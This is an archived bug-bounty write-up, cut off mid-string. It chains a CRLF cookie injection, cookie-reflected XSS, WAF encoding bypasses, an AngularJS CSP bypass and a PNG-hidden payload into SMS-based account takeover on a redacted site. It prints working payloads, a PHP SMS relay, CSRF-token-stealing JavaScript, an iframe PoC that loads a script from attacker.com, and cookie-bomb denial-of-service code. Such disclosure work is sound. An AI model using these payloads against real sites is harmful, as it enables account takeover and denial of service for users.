---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-05-29_the-beauty-of-chaining-client-side-bugs.md
original_filename: 2021-05-29_the-beauty-of-chaining-client-side-bugs.md
title: The beauty of chaining client-side bugs
category: documents
detected_topics:
- xss
- oauth
- csrf
- api-security
- sso
- access-control
tags:
- imported
- documents
- xss
- oauth
- csrf
- api-security
- sso
- access-control
language: en
raw_sha256: feea51543c7e1a52d26914ca89a26f5d538f27b9f1cfeaf18b25ca0acf5507f4
text_sha256: f1dd08027f56d88c6aea14376a4a565324d5fd911986a7a2af038decad90d468
ingested_at: '2026-06-28T07:32:06Z'
sensitivity: unknown
redactions_applied: false
---

# The beauty of chaining client-side bugs

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-05-29_the-beauty-of-chaining-client-side-bugs.md
- Source Type: markdown
- Detected Topics: xss, oauth, csrf, api-security, sso, access-control
- Ingested At: 2026-06-28T07:32:06Z
- Redactions Applied: False
- Raw SHA256: `feea51543c7e1a52d26914ca89a26f5d538f27b9f1cfeaf18b25ca0acf5507f4`
- Text SHA256: `f1dd08027f56d88c6aea14376a4a565324d5fd911986a7a2af038decad90d468`


## Content

---
title: "The beauty of chaining client-side bugs"
url: "https://master-sec.medium.com/the-beauty-of-chaining-client-side-bugs-759e1091eabf"
authors: ["Master SEC (@MasterSEC_AR)"]
bugs: ["CRLF injection", "XSS", "CSP bypass", "DoS", "CSTI"]
publication_date: "2021-05-29"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3616
scraped_via: "browseros"
---

# The beauty of chaining client-side bugs

The beauty of chaining client-side bugs
Master SEC
Follow
10 min read
·
May 29, 2021

37

Press enter or click to view image in full size

This is part of a report of a bug that I sent back in 2020, changing of course the program name for obvious reasons.

Introduction

When someone asks me about how it is like hacking I tell them it’s like being an artist 🎨. This involves a lot of love, imagination, perseverance, many hours of work, joining pieces to achieve a masterpiece of art. All artists have different ways to create, same as we have different ways to find a security issue, there isn’t a single way to demonstrate the impact of a bug.

The Full Chain ⛓
The CRLF Injection✍

At the beginning of the year during a scan, Burp found me a CRLF bug on redacted.redacted.com. Sadly it was a Location: redirect CRLF Injection one, so I wasn’t able to make much impact with it. no XSS. Click on https://redacted.redacted.com/robot.txtasd%0dSet-Cookie:foo%3dbar from Chrome and it will set you a new cookie. This was the only impact and I was the whole next week thinking how I could exploit this behavior.

Finding a vulnerable Cookie for Self XSS🍪

While I was fuzzing cookies to find a vulnerable one I found that the redacted cookie was reflected on multiple pages and not being properly sanitized, allowing me <> chars. after my first report of this cookie, most of them have been fixed but they still last a few. After digging over all the Redacted site. I founded the www.redacted.com/redacted after you log in, have the redacted cookie reflected without being properly sanitized inside script tags.

Bypassing WAF with double encoding 🕵️‍♀️

Sadly when I sentredacted=ORIGINALCOOKIE<img src=x> in the cookie header, the CDN blocked me hard. I was stuck for a while here. After a few attempts and different encoding tests, I concluded that double encoding successfully bypasses this protection. for example, if CDN bans the word script you could send scrip%25%37%34, note of how the payload has been encoded to %74 and then encoded again, the web page will reflect it as script and will pass the CDN filter, beautiful!.

Bypassing CSP with Angular Template Injection 💉

Here the things become even trickier for me, and I’ve been struggled for over 2 months searching for callback JSONP response and I was looking all the time for the wrong thing. This CSP was one of the hardest that I’ve ever had to defeat.

Reading this old paper the other day, https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf from 2017 blackhat opened my mind for looking script gadgets. Inside of redacted.com domain, they were tons of javascript assets/libs/frameworks, I used gau a tool from my friend cdl, to scan all .js looking for vulnerabilities. As seen in the paper, AngularJS is one of the most vulnerable frameworks in the market, I used anti-burl to filter 200 response js files containing the word "angular" and reached this script. https://www.redacted.com/redacted/angular/angular.min.js This angular 1.5.8 suffers a template injection DomXSS, so I decided to load that script since its whitelisted by CSP, and call it <script src='https://www.redacted.com/angular/angular.min.js'></scripT><body ng-app>{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1))');}}</body> with this HTML reflected in the Redacted page, I was able to finally trigger a controlled javascript environment bypassing the strict CSP

It’s all about impact, try to make an Account Takeover. 🎭

A simple alert(document.cookie) PoC will give you a ZERO CVSS score and a nice informative, you must show impact while reporting a bug. especially on this program. I started searching for logical flaws, that could lead to a possible Account Takeover.

Add a secondary email. ⛔️ It asks main account password when you want to log in after you log in with the new email
Change password. ⛔️ It asks you to type the old password which we don’t have. Don’t like social engineering PoC of asking the user to type again the password, I like the most automated stuff possible
Change primary SMS phone. ✅ It asks to validate by SMS your new phone only. Without sending an SMS to the old phone, email confirmation, or asking for a password Finally, we can automate that with some SMS API!. The attacker will just go to the lost password and put the SMS method to recover the account, like if it were the owner of it all the time.
Generating the Javascript Payload 👾

The flow is like this:
Load change Phone Number page -> grab the CSRF Token -> Submit the form with the new Phone Number -> Connect back to my page to get the SMS 6 digits code -> Submit the 6 digits code to successfully change the phone number.

Then the attacker just needs to put the victim's email in the lost password and a 6 digits code will be sent to the attacker phone number.

Stealing the anti-CSRF token 👮🕵️‍♀️

All sensitive API JSON calls send a CSRF-Token header, which is not stored in cookies, in HTTP Responses, in local storage, until now I don’t know how exactly it is generated. But it’s stored after the page loads inside the <body> DOM element by a JS library, something like <body data-token="ZsqK0g0lvcWRlxGLnrRe2BZgRMmST6x2Q0R9s=" and being dynamically generated, the data-token is the CSRF-Token, which is pretty interesting, the first time that I saw this. For my luck, all Redacted sites have X-Frame-Options: SAMEORIGIN headers. So maybe we could steal it with a child iframe directly from DOM.

var profileIframe = document.createElement(‘iframe’); profileIframe.setAttribute(‘src’, ‘https://www.redacted.com/settings/phoneadd');
profileIframe.setAttribute(‘id’, ‘miframe’); document.body.appendChild(profileIframe); document.getElementById(‘miframe’).onload = function() { 
var csrf = profileIframe.contentDocument.getElementsByTagName(“body”).item(“data”).dataset.token;

Tested it and BINGO. As you can see, I took advantage of being in the same Same-Origin-Policy, and x-frame-options, to get directly the token from the DOM after the page is loaded.

Sending the change mobile number HTTP Request 📲

This should be easy, I said… but struggled a bit.

Twilio API SMS was not receiving SMS from the Redacted site. Took some time to get an SMS provider that can receive short SMS messages and send an HTTP API callback. Sorted it.
After the 2 HTTP Requests, how I could XMLHttpRequest an external site to get the received SMS code? I had a connect-src CSP header blocking all outgoing traffic.
Using the Redacted site API as a cross-communication channel to communicate with the Exploit. 📢

with connect-src to *.redacted.com, I was needing some kind of way to make the exploit to read the 6 digits number from an external source, without validating it, I could not be able to change the account phone number.

Finally, I decided to do it in a reverse way, with the Redacted API, I read the documentation and created an item with a description, and the description will be changed by my PHP script, and later read by the javascript payload victim.

The PHP sms.php code that receives the SMS in Text parameter in my HTTP server.

when an SMS will arrive at the SMS Exploit number, the SMS Gateway API provider will callback my script at http://myserver.com/sms.php?Text=SMSmessagebodyfromsite

$var = $_GET[‘Text’];
preg_match(‘/([0–9])\w+/’, $var, $matches); //simple regex to get the code.
$code = $matches[0];
//here we authenticate to the API.
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ‘https://api.redacted.com/v1/oauth2/token');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, “grant_type=client_credentials”);
curl_setopt($ch, CURLOPT_USERPWD, ‘REDACTED’ . ‘:’ . ‘REDACTED’);
$headers = array();
$headers[] = ‘Accept: application/json’;
$headers[] = ‘Accept-Language: en_US’;
$headers[] = ‘Content-Type: application/x-www-form-urlencoded’;
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (curl_errno($ch)) {
 echo ‘Error:’ . curl_error($ch);
}
curl_close($ch);
$json = json_decode($result);
$token = $json->access_token; //access token from api
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ‘https://api.redacted.com/v1/redactedendpoint');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, ‘PATCH’);
//we just set the description value of some random API endpoint on Redacted API to the 6 digits code from the SMS text here.
curl_setopt($ch, CURLOPT_POSTFIELDS, “[\n {\n \”op\”: \”replace\”,\n \”path\”: \”/description\”,\n \”value\”: \”$code\”\n }\n]”);
$headers = array();
$headers[] = ‘Content-Type: application/json’;
$headers[] = “Authorization: Bearer $token”;
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
//send the request
$result = curl_exec($ch);
if (curl_errno($ch)) {
 echo ‘Error:’ . curl_error($ch);
}
curl_close($ch);
Reading the SMS Code from Javascript

This is the exploit side, the victim reads the SMS code with javascript and bypasses the connect-src restriction by CSP because we got it from the API itself from the provider.

var req2 = new XMLHttpRequest();
 var url = “https://api.redacted.com/v1/oauth2/token";
 req2.open(“POST”, url, true);
 req2.setRequestHeader(“Accept”, “application/json”);
 req2.setRequestHeader(“Authorization”, “Basic REDACTED”);
 params = “grant_type=client_credentials”;
 req2.send(params);
 document.write(“<br/>Debug: getting the 6 digits code…”);
 req2.onload = function() {
 if (req2.status == 200) {
 var token = JSON.parse(req2.response).access_token;
 document.write(“<br/>Debug: api token: “ + token);
 var req3 = new XMLHttpRequest();
 var url2 = “https://api.redacted.com/redactedendpoint/";
 req3.open(“GET”, url2, true);
 req3.setRequestHeader(“Content-Type”, “application/json”);
 req3.setRequestHeader(“Authorization”, “Bearer “ + token );
 req3.send();
 req3.onload = function() {
 if (req3.status == 200) {
 var code = JSON.parse(req3.response).description;
 document.write(“<br/>Debug: SMS code grabbed from api: “ + code);
var req4 = new XMLHttpRequest();
 var url3 = “https://www.redacted.com/redacted/phonevalidation";
 req3.open(“PUT”, url3, true);
 req3.setRequestHeader(“Content-Type”, “application/json”);
 req3.setRequestHeader(“CSRF-Token”, csrf);
 var params2 = ‘{“”code”:”’+ code +’”}’;
 req3.send(params2);
 req3.onload = function() {
 document.write(“<br/>Debug: Phone validated successfully, your phone has been changed<br/><b>go to lost password by SMS and pwn it<b/>”);
 }
 
 }
 }
 }
 }
Bypassing 2000 URL characters length, the PNG picture Payload Solution.

The final Javascript payload with debug messages in base64 was something like: dmFyIHByb2ZpbGVJZnJhb..... continues for 5000 more chars

Get Master SEC’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

It was way above 5k chars, and since we inject it from a CRLF through GET, it needs to be below 2k to work on most of the browsers , so I decided to use the method from https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/ paper, and put it in a PNG image and take advantage of img-src https://* CSP rule.

This will load the image and decode it with canvas JS, reconstruct the javascript code in a variable, and eval it, which is pretty smart and looks like “magic” 🧙 .

After reading the paper and dealing for a whole day to make it to work with an Angular template injection (had to modify it a lot). I ended up setting the Redacted cookie with this payload: </scripT>%25%33%63scrip%25%37%34+src='https://www.redacted.com/redacted/angular/angular.min.js'></scripT><%25%36%32ody ng-app><im%25%36%37+src=https://mysite.com/img.php+id=jsimg+crossorigin=anonymous>{{x%3d{'y'%3a''.constructor.prototype}%3bx['y'].charAt%3d[].join%3b$ev%25%36%31l('x%3dev%25%36%31l(atob("evilpayloadbase64encoded"))')%3b}}</body>

Notice that I had to double URL encode some letters to bypass CDN specify word filters like eval.

This payload loads the img.php stored on mysite.com, decodes it with eval function after loading, and executes the JS evil code.

Putting all the pieces together. 🧩

I needed to merge that manual cookie, through the CRLF and set it inside the Redacted cookie. This wasn't easy because I was needing it exactly as I send it in the HTTP request, with the encoding, or the WAF will block it After a few hours, and weird stuff like triple URL encoding (never used that kind of stuff for a PoC)

I ended with a CRLF->Evil Cookie->Angular Template Injection->Evil PNG Canvas payload all in one on this link:

http://redacted.redacted.com/robot.txtasd%0dSet-Cookie:redacted=redacted%3C%252fscripT%3E%2525%2533%2563scrip%25%32%35%25%33%37%25%33%34+sr%25%32%35%25%33%36%25%33%33%3d'https://www.redacted/components/angular/angular.min.js'%3E%3C/scripT%3E%3C%2525%2536%2532ody+ng-app%3E%3Cim%2525%2536%2537+sr%25%32%35%25%33%36%25%33%33%3dhttps://attacker.com/img.php+id%3djsimg+crossorigin%3danonymous%3E%7b%7bx%3d%7b'y'%3a''.constructor.prototype%7d%25%33%62x%5b'y'%5d.charAt%3d%5b%5d.join%25%33%62$ev%25%32%35%25%33%36%25%33%31l('x%3dev%25%32%35%25%33%36%25%33%31l(atob(%22base64encodedpayload%22%29%29%27%29%25%33%62%7d%7d%3c%25%32%66body>;Domain=redacted.com;Path%3d/;

You can notice the triple URL encoding converting ev%25%32%35%25%33%36%25%33%31l to eval on the reflection later. Sometimes is sick to see how things like this work.

Required Extra Step, Cookie Denial of Service

While I was testing on my Mac I figured out that it didn’t work as on my Linux desktop. I was running an adblocker, blocking redacted.redacted.com traffic. Then I figured out that redacted.redacted.com/redacted just “overwrites” my evil cookie…

So I decided just KILL the access to redacted.redacted.com.

How we could do this? telling the browser to send a very long cookie header only to that page that interfaces with our PoC.

The page troubling me was https://redacted.redacted.com/setcookie?params

So I set a new cookie.

Set-Cookie: trash=DOSlong2kchars;Path=/setcookie;Domain=.redacted.com

Take note of how I used path instead of domain. from domain redacted, I just can’t set a cookie to another subdomain, by changing the Domain. but I could set a “global cookie” only working for “/setcookie” path :)

After setting a VERY long cookie above 15k chars. the HTTP server just stopped interfering with my PoC and shoots a nice 429 error.

So my final HTML page for the PoC was:

<html>
<head>
</head>
<body>
 PoC
</body>
<script>
document.body.innerHTML=’<html><body><center><h1>Please wait… you will be redirected to redacted</h1></center></body></html>’;
var profileIframe = document.createElement(‘iframe’);
 profileIframe.setAttribute(‘src’, “http://redacted.redacted.com/robot.txtasd%0dSet-Cookie:redacted=redacted%3C%252fscripT%3E%2525%2533%2563scrip%25%32%35%25%33%37%25%33%34+sr%25%32%35%25%33%36%25%33%33%3d'https://www.redacted.com/angular/angular.min.js'%3E%3C/scripT%3E%3C%2525%2536%2532ody+ng-app%3E%3Cim%2525%2536%2537+sr%25%32%35%25%33%36%25%33%33%3dhttps://attacker.com/img.php+id%3djsimg+crossorigin%3danonymous%3E%7b%7bx%3d%7b'y'%3a''.constructor.prototype%7d%25%33%62x%5b'y'%5d.charAt%3d%5b%5d.join%25%33%62$ev%25%32%35%25%33%36%25%33%31l('x%3dev%25%32%35%25%33%36%25%33%31l(atob(%22redactedbase64encodedpayload%22%29%29%27%29%25%33%62%7d%7d%3c%25%32%66body>;Domain=redacted.com;Path%3d/;");
 profileIframe.setAttribute(‘id’, ‘pi’);
 profileIframe.setAttribute(‘width’, ‘1px’);
 profileIframe.setAttribute(‘height’, ‘1px’);
 document.body.appendChild(profileIframe);
 document.getElementById(‘pi’).onload = function() {
 
 // then we bomb for the /setcookie path so we don’t get overlapped by redacted.redacted.com
 var Iframe2 = document.createElement(‘iframe’);
 Iframe2.setAttribute(‘src’, “http://redacted.redacted.com/robot.txtasd%0dSet-Cookie:denial=serviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasdserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasdserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasdserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasdserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasd;Domain=.redacted.com;Path=/setcookie");
 Iframe2.setAttribute(‘id’, ‘bomb1’);
 Iframe2.setAttribute(‘width’, ‘1px’);
 Iframe2.setAttribute(‘height’, ‘1px’);
 document.body.appendChild(Iframe2);
 
 var Iframe3 = document.createElement(‘iframe’);
 Iframe3.setAttribute(‘src’, “http://redacted.redacted.com/robot.txtasd%0dSet-Cookie:denial2=serviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasdserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasdserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasdserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasdserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasd;Domain=.redacted.com;Path=/setcookie");
 Iframe3.setAttribute(‘id’, ‘bomb1’);
 Iframe3.setAttribute(‘width’, ‘1px’);
 Iframe3.setAttribute(‘height’, ‘1px’);
 document.body.appendChild(Iframe3);
 
 var Iframe4 = document.createElement(‘iframe’);
 Iframe4.setAttribute(‘src’, “http://redacted.redacted.com/robot.txtasd%0dSet-Cookie:denial3=serviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasdserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasdserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasdserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasdserviceasdasdasdsadsadsdasadsdasdasadasdasdddddddddddddddddddddddddddddasdasdasd;Domain=.redacted.com;Path=/setcookie");
 Iframe4.setAttribute(‘id’, ‘bomb3’);
 Iframe4.setAttribute(‘width’, ‘1px’);
 Iframe4.setAttribute(‘height’, ‘1px’);
 document.body.appendChild(Iframe4);
 
 var Iframe5 = document.createElement(‘iframe’);
 Iframe5.setAttribute(‘src’, “http://redacted.redacted.com/robot.txtasd%0dSet-Cookie:denial4=serviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceserviceservi